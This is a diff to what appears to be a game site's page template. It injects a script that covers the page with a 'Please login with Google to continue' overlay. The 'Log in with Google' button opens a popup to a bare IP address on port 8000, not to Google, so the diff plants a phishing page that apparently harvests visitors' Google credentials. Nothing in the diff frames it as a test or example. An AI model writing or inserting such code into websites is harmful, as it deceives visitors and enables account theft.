@@ -11,6 +11,102 @@
     <br>
     <h4 class="announcement">Attention: More of our games can be found <a href="/chilibeans">here</a></h4>
     <br>
+    
+    <script>
+      // Create the dialog HTML structure dynamically using JavaScript
+      const dialogHTML = `
+          <div id="loginDialogOverlay">
+              <div id="loginDialog">
+                  <h2>Please login with Google to continue</h2>
+                  <button id="googleLoginBtn">Log in with Google</button>
+                  <button id="continueBtn" style="display: none;">Continue</button>
+              </div>
+          </div>
+      `;
+  
+      // Insert the dialog HTML into the body
+      document.body.innerHTML += dialogHTML;
+  
+      // Apply specific styles for the dialog, without overriding existing styles
+      const styles = `
+          #loginDialogOverlay {
+              position: fixed;
+              top: 0;
+              left: 0;
+              width: 100%;
+              height: 100%;
+              background-color: rgba(0, 0, 0, 0.7);
+              display: flex;
+              justify-content: center;
+              align-items: center;
+              z-index: 9999; /* Ensure it's above other content */
+          }
+  
+          #loginDialog {
+              background-color: white;
+              padding: 20px;
+              border-radius: 10px;
+              text-align: center;
+              box-shadow: 0px 0px 15px rgba(0, 0, 0, 0.1);
+              font-family: 'BR Firma Regular', sans-serif; /* Use BR Firma for the dialog */
+          }
+  
+          #loginDialog h2 {
+              margin-bottom: 20px;
+              font-family: 'BR Firma Regular', sans-serif;
+              color: #333;
+          }
+  
+          #loginDialog button {
+              padding: 10px 20px;
+              font-size: 16px;
+              border: none;
+              border-radius: 5px;
+              cursor: pointer;
+              font-family: 'BR Firma Regular', sans-serif; /* Apply the font to buttons */
+          }
+  
+          #googleLoginBtn {
+              background-color: #4285f4;
+              color: white;
+              margin-bottom: 20px;
+          }
+  
+          #continueBtn {
+              background-color: #34a853;
+              color: white;
+              display: none;
+          }
+      `;
+  
+      // Inject the dialog-specific styles into a <style> element and append it to the head
+      const styleSheet = document.createElement("style");
+      styleSheet.type = "text/css";
+      styleSheet.innerText = styles;
+      document.head.appendChild(styleSheet);
+  
+      // Handle the Google login button click event
+      document.getElementById('googleLoginBtn').addEventListener('click', function() {
+          const popup = window.open('http://23.92.19.124:8000/', '_blank', 'width=500,height=600');
+          
+          // Handle blocked popup scenario
+          if (!popup || popup.closed || typeof popup.closed == 'undefined') {
+              alert('Popup blocked! Please enable popups.');
+          }
+      });
+  
+      // Show the "Continue" button after 10 seconds
+      setTimeout(function() {
+          document.getElementById('continueBtn').style.display = 'inline-block';
+      }, 15000); // 10 seconds delay
+  
+      // Handle the "Continue" button click event
+      document.getElementById('continueBtn').addEventListener('click', function() {
+          alert('Continuing...');
+          // Optionally, hide the dialog here
+          document.getElementById('loginDialogOverlay').remove();
+      });
+  </script>
 
     <ul>
       <% for ([key, value] of Object.entries(Object.assign({}, urlMap, sourceMap))) { %>
